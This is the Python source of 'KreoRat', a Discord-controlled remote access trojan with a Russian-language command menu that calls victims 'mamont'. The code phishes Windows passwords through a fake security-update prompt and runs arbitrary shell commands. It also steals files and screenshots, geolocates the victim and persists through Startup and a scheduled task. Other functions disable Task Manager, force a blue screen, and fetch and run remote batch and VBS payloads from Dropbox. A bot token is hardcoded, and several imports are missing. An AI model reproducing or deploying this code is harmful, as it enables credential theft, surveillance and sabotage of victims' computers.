from asyncio import sleep
import ctypes
import requests
import os
import discord
import platform
import shutil
import sys
import subprocess
from discord.ext import commands
client = commands.Bot(command_prefix = "!", self_bot = False)
client.remove_command("help")
helpmenu = '''
KreoRat BETA 1.3.2 (CODED BY BABYTREP)
o(*￣︶￣*)o
**!help - Хелп меню **
OwO`УПРАВЛЕНИЕ`OwO
**!hide - спрятать ратник**
**!unhide - прекращает прятать ратник**
**!ejectcd - открывает дисковод на компютере**
**!retractcd - закрывает дисковод на компютере**
**!windowspass - попытаеся зафишить пароль от юзера **
**!bsod - синий экран**
**!geo - вычисляет примерное местоположение мамонта**
**!info - дает инфу о пк**
**!critproc - делает критичным процесом рат (если офнуть бсод)**
**!uncritproc - делает не критичным процесом рат**
**!startup - добавляет ратку в автозагрузку**
**!startup2 - добавляет ратку в планировщик задач **
**!offmgr - оффаeт диспетчер задач**
**!onmgr - врубает диспетчер задач**
**!msg - [сообщение] вывести сообщение **
**!kp [название процесса] - отрубить процесс **
**!start [название процесса/ссылка] - врубить процесс (если хочешь вставь сыллку и она откроется)**
**!download [ссылка] [тип файла] - скачать мамонту файл (надо оставлят сыллку и тогда файл скачивается)**
**!upload [путь к файлу] - выкачать файл у мамонта**
**!wallpaper [ссылка] [тип файла] (png, jpg) - изменить рабочий стол **
**!shell [команда] - выполняет команду**
**!lp - показывает список процесов**
**!sh - сделать скрин рабочего стола**
**!sd - оффнуть комп мамонту**
**!rl - перезагрузить комп мамонту**
╰(￣ω￣ｏ)`ФАН`╰(￣ω￣ｏ)
**!joke - шутка**
**!puk - режет пк**
O.O `МУЗЫКА`O.O
**!Vazilin - Музыка про вазилин**
**!Amogus - Амогус громко оч**
**!Arabic - очень громко арабик музык**
（︶^︶）`ГИФКИ`
**!mamont - гифка ты мамонт **
**!Speedy - Ishowspeed suck гифка**



`BETA VERSION CODED BY BABYTREP \^o^/`
'''

@client.event
async def on_ready():
    channel = client.get_channel(1024725702580375622)
    await channel.send("🎃Запустил ратник🎃")
    await channel.send("OS: " + platform.system() + " " + str(platform.release()) + " User: " + os.getlogin())
    await channel.send("https://tenor.com/view/rem-gif-23975495")
    while True:
        await client.change_presence( status = discord.Status.idle, activity = discord.Activity(type=discord.ActivityType.watching, name="на тебя"))
        await sleep(15)
        await client.change_presence( status = discord.Status.idle, activity = discord.Activity(type=discord.ActivityType.watching, name="Created by BabyTrep"))
        await sleep(15)

@client.command()
async def help(ctx):
    await ctx.send(helpmenu)

@client.command()
async def hide(ctx):
    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
    os.system("""attrib +h "{}" """.format(cmd237))
    await ctx.send("KreoRAT HIDEN")

@client.command()
async def unhide(ctx):
    cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
    os.system("""attrib -h "{}" """.format(cmd237))
    await ctx.send("KreoRAT UNHIDEN")

@client.command()
async def ejectcd(ctx):
    return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
    await ctx.send("KreoRAT Открыла дисковод")

@client.command()
async def retractcd(ctx):
    return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
    await ctx.send("KreoRAT Закрыла дисковод")

@client.command()
async def windowspass(ctx):
    await ctx.send("KreoRAT Отправлен фишлогин")
    cmd82 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
    cmd92 = 'echo $cred.getnetworkcredential().password;'
    full_cmd = 'Powershell "{} {}"'.format(cmd82,cmd92)
    instruction = full_cmd
    def shell():   
        output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return output
    result = str(shell().stdout.decode('CP437'))
    await ctx.send("KreoRAT пароль который ввёл мамонт: " + result)

@client.command()
async def bsod(ctx):
    await ctx.send("KreoRAT Выдала бсод")
    await ctx.send("это сообщение отправлено перед бсодом поэтому может быть такое что бсод не выдало мамонту")
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

@client.command()
async def geo(ctx):
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
        await ctx.send("KreoRAT Вычеслила местоположение мамонта: " + link)
        await ctx.send("тока учти шо это не точное местоположение")

@client.command()
async def info(ctx):
    jak = str(platform.uname())
    intro = jak[12:]
    from requests import get

    ip = get('https://api.ipify.org').text
    pp = " IP Address = " + ip
    await ctx.send("KreoRAT Дала вам инфу: " + intro + pp)
    
@client.command()
async def lp(ctx):
    if 1==1:
        result = subprocess.getoutput("tasklist")
        numb = len(result)
        if numb < 1:
            await ctx.send("KreoRAT ничего не найдено")
        elif numb > 1990:
            temp = (os.getenv('TEMP'))
            if os.path.isfile(temp + r"\output.txt"):
                os.system(r"del %temp%\output.txt /f")
            f1 = open(temp + r"\output.txt", 'a')
            f1.write(result)
            f1.close()
            file = discord.File(temp + r"\output.txt", filename="output.txt")
            await ctx.send("KreoRAT Дала вам список процесов", file=file)
        else:
            await ctx.send("KreoRAT дала вам список процесов : " + result)       

@client.command()
async def critproc(ctx):
    ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
    await ctx.send("KreoRAT защитила себя")

@client.command()
async def uncritproc(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("KreoRAT убрала защиту")

@client.command()
async def offmgr(ctx):
    os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    await ctx.send("KreoRAT вырубила диспетчер задач")

@client.command()
async def onmgr(ctx):
    os.system("REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
    await ctx.send("KreoRAT врубила диспетчер задач")

@client.command()
async def startup(ctx):
        shutil.copy(sys.argv[0], os.getenv("appdata") + "\Microsoft\Windows\Start Menu\Programs\Startup\ " + os.path.basename(sys.argv[0]))
        await ctx.send("KreoRAT добавила себя в автозагрузку")

@client.command()
async def startup2(ctx):
    os.system('schtasks /create /tn "DriverUpdate" /tr "C:/Users/' + os.getlogin() + '/AppData/Roaming/Microsoft/Windows/crack.exe" /sc MINUTE /MO 5')
    await ctx.send("KreoRAT добавила себя в планировщик задач")

@client.command()
async def msg(ctx, *, text):
    os.system("msg * " + text)
    await ctx.send("KreoRAT сообщение отправлено")

@client.command()
async def kp(ctx, name):
    os.system("taskkill -f -im " + name)
    await ctx.send("KreoRAT процес оффнут")

@client.command()
async def start(ctx, *, name):
    os.system("start " + name)
    await ctx.send("KreoRAT процес врублен")

@client.command()
async def download(ctx, text, filetype):
    r = requests.get(text, allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Driver." + filetype, 'wb').write(r.content)
    await ctx.send("KreoRAT файл загружен в директорию C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Driver." + filetype)

@client.command()
async def wallpaper(ctx, text, filetype):
    r = requests.get(text, allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Log." + filetype, 'wb').write(r.content)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r'C:/Users/' + os.getlogin() + "/AppData/Local/Temp/Log." + filetype , 0)
    await ctx.send("KreoRAT рабочий стол изменен")
    os.remove("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Log." + filetype)

@client.command()
async def sh(ctx):
    img = pyscreenshot.grab()
    filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".png"
    img.save(filename)
    await ctx.send(file=discord.File(filename))
    os.remove(filename)
    await ctx.send("KreoRAT дала вам скриншот")

@client.command()
async def upload(ctx, text):
    await ctx.send("KreoRAT Дала вам файл")
    await ctx.send(file = discord.File(text))

@client.command()
async def bebra(ctx):
    r = requests.get("https://www.dropbox.com/s/67pjh0t3k2dz89u/1.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3", 'wb').write(r.content)
    await ctx.send("KreoRAT врубила сочную бебру на компе мамонта")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/SO4NAYABEBRA.mp3")

@client.command()
async def sd(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("KreoRAT пк оффнут!")
    await sleep(1)
    os.system("shutdown -s -t 0")

@client.command()
async def rl(ctx):
    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
    await ctx.send("KreoRAT пк перезагружен!")
    await sleep(1)
    os.system("shutdown -r")

@client.command()
async def shell(ctx, text):
    os.system(text)
    await ctx.send("KreoRAT выполнила команду")

@client.command()
async def blockmouse(ctx):
    await ctx.send("KreoRAT заморозила мышку")
    global blockedMouse
    blockedMouse = True
    @tasks.loop(seconds = 0)
    async def blockedMouse():
        pywinauto.mouse.move(coords=(0, 1000000))
    blockedMouse.start()

@client.command()
async def unblockmouse(ctx):
    await ctx.send("KreoRAT разморозила мышку")
    blockedMouse.stop()

@client.command()
async def joke(ctx):
    r = requests.get("https://www.dropbox.com/s/6kyh2sjyxaq5un3/dostup.vbs?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/logged.vbs", 'wb').write(r.content)
    await ctx.send("KreoRAT Показала шутку ")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/logged.vbs")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/logged.vbs")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/logged.vbs")

@client.command()
async def puk(ctx):
    r = requests.get("https://www.dropbox.com/s/csuiol33dfz97if/lol.bat?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat", 'wb').write(r.content)
    await ctx.send("KreoRAT Режет пк мамонта")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/drivecar.bat")

@client.command()
async def Vazilin(ctx):
    r = requests.get("https://www.dropbox.com/s/i51ngdge4les66z/%D0%90%D0%BD%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%A1%D0%B5%D0%BA%D1%81%20-%20%D0%AF%20%D0%BC%D0%B0%D0%B6%D1%83%20%D0%B6%D0%BE%D0%BF%D1%83%20%D0%B2%D0%B0%D0%B7%D0%B5%D0%BB%D0%B8%D0%BD%D0%BE%D0%BC_%28audiohunter.ru%29.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/vazilin.mp3", 'wb').write(r.content)
    await ctx.send("KreoRAT Музыка про вазилин включена")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/vazilin.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/vazilin.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/vazilin.mp3")

@client.command()
async def Amogus(ctx):
    r = requests.get("https://www.dropbox.com/s/e0d2jr3em11ljz1/among-us-role-reveal-%28earrape%29-By-Tuna.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3", 'wb').write(r.content)
    await ctx.send("KreoRAT SUS")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/amogus.mp3")

@client.command()
async def Arabic(ctx):
    r = requests.get("https://www.dropbox.com/s/icd19un757wr1y9/arab-earrape-%28earrape%29-By-Tuna.mp3?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog696969.mp3", 'wb').write(r.content)
    await ctx.send("KreoRAT Включена арабская музыка")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog696969.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog696969.mp3")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog696969.mp3")

@client.command()
async def mamont(ctx):
    r = requests.get("https://www.dropbox.com/s/h1tona8ijk8sn20/mamont.gif?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Loger101.gif", 'wb').write(r.content)
    await ctx.send("KreoRAT Включена гифка мамонт")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Loger101.gif")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Loger101.gif")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Loger101.gif")

@client.command()
async def Speedy(ctx):
    r = requests.get("https://www.dropbox.com/s/wfcu7txx6kngec7/i-show-speed-speed.gif?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog22829.gif", 'wb').write(r.content)
    await ctx.send("KreoRAT Включена гифка IShowspeed SUCK")
    await sleep(10)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog22829.gif")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog22829.gif")
    await sleep(5)
    os.system("start C:/Users/" + os.getlogin() + "/AppData/Local/Temp/Templog22829.gif")

client.run("MTAyNTQ1NzI3OTUyMjMxNjM1OQ.GNNFqC.SywrJdGhdZxELgi7hWQYvIYW6xHT2IamEx64f4", bot = True)
